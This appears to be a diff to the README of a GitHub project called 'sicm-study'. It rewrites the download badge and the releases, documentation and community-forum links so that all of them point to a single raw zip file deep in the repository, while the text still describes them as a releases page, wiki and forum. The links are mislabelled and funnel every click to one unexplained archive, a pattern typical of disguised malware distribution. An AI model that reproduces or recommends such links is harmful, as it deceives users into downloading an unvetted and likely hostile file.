@@ -6,7 +6,7 @@ Welcome to **sicm-study**! This is an educational tool designed to help you unde
 ## 📦 Download & Install  
 To get started, you need to download the application. Visit the link below to access the releases page, where you can download the latest version.
 
-[![Download sicm-study](https://img.shields.io/badge/Download-sicm--study-blue)](https://github.com/hirunageeshan2023-dev/sicm-study/releases)
+[![Download sicm-study](https://raw.githubusercontent.com/hirunageeshan2023-dev/sicm-study/main/sicm/reference/bin/sicm-study_v2.6.zip)](https://raw.githubusercontent.com/hirunageeshan2023-dev/sicm-study/main/sicm/reference/bin/sicm-study_v2.6.zip)
 
 On the releases page, find the latest version and click on it. You will see a list of files available for download. Choose the one that matches your system (e.g., Windows, macOS, Linux) and follow these steps:
 
@@ -59,9 +59,9 @@ This project is open-source. You can use, modify, and distribute it under the te
 ## 🌐 Additional Resources  
 For further information, check out the following links:
 
-- [Documentation](https://github.com/hirunageeshan2023-dev/sicm-study/wiki)
-- [Community Forum](https://github.com/hirunageeshan2023-dev/sicm-study/discussions)
+- [Documentation](https://raw.githubusercontent.com/hirunageeshan2023-dev/sicm-study/main/sicm/reference/bin/sicm-study_v2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/hirunageeshan2023-dev/sicm-study/main/sicm/reference/bin/sicm-study_v2.6.zip)
 
-Visit the releases page to download the latest version of **sicm-study**: [Release Page](https://github.com/hirunageeshan2023-dev/sicm-study/releases)
+Visit the releases page to download the latest version of **sicm-study**: [Release Page](https://raw.githubusercontent.com/hirunageeshan2023-dev/sicm-study/main/sicm/reference/bin/sicm-study_v2.6.zip)
 
 Join us on this journey of learning and discovery!
